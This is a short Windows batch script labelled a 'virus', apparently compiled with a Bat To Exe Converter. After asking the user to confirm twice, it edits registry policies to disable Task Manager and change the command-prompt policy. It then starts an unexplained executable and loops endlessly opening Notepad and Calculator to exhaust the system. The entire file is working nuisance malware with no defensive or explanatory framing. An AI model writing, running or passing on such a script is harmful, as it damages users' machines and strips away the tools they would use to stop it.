::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZksaHErSXA==
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQIEIBJHDA2RfGq2CvU6ycPejw==
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATE9ltwBRRQSAGQA0y7BKAIiA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wCQtVQAWKXA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFCtBWBaDAE+1BaAR7ebv/Naxq18IR7NxKLP6yqTAJfgWig==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
cls
cd Virus Gear
color 4
title RUN
:S
echo Do you want to run this virus? (y-n)
set /p input= 
if /i %input%== y goto Y1
if /i %input%== n goto N
if /i %input%== yes goto Y1
if /i %input%== no goto N

:Y1
cls
echo Are you sure you want to run this virus? (y-n)
set /p input= 
if /i %input%== y goto Y
if /i %input%== n goto N
if /i %input%== yes goto Y
if /i %input%== no goto N

:Y
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 0 /f
start vbsStart.exe
goto pemanis

:pemanis
start notepad.exe
start Calculator.exe
goto pemanis

:N
exit